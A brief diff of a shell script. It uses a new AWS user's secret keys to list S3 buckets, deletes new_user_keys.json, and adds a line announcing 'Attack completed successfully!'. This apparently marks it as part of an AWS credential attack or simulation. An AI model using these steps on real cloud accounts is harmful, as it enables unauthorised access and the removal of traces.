@@ -55,5 +55,6 @@ AWS_SECRET_ACCESS_KEY="${SECRET_KEY}" \
 AWS_DEFAULT_REGION="us-east-1" \
 sudo aws s3 ls --profile newuser
 
+echo "Attack completed successfully!"
 # Clean up temporary file
 rm new_user_keys.json
